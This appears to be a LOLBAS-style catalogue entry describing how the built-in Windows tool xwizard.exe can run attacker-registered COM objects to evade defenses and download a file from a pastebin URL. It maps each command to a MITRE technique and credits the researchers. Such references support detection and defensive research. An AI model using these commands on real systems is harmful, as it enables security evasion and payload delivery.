---
Name: Xwizard.exe
Description:
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}
    Description: Xwizard.exe running a custom class that has been added to the registry.
    Usecase: Run a com object created in registry to evade defensive counter measures
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}
    Description: Xwizard.exe running a custom class that has been added to the registry. The /t and /u switch prevent an error message in later Windows 10 builds.
    Usecase: Run a com object created in registry to evade defensive counter measures
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://pastebin.com/raw/iLxUT5gM
    Description: Xwizard.exe uses RemoteApp and Desktop Connections wizard to download a file.
    Usecase: Download file from Internet
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows 10
Full_Path:
  - Path: C:\Windows\System32\xwizard.exe
  - Path: C:\Windows\SysWOW64\xwizard.exe
Code_Sample:
- Code:
Detection:
 - IOC:
Resources:
  - Link: http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/
  - Link: https://www.youtube.com/watch?v=LwDHX7DVHWU
  - Link: https://gist.github.com/NickTyrer/0598b60112eaafe6d07789f7964290d5
  - Link: https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/
  - Link: https://twitter.com/notwhickey/status/1306023056847110144
Acknowledgement:
  - Person: Adam
    Handle: '@Hexacorn'
  - Person: Nick Tyrer
    Handle: '@NickTyrer'
  - Person: harr0ey
    Handle: '@harr0ey'
  - Person: Wade Hickey
    Handle: '@notwhickey'
---
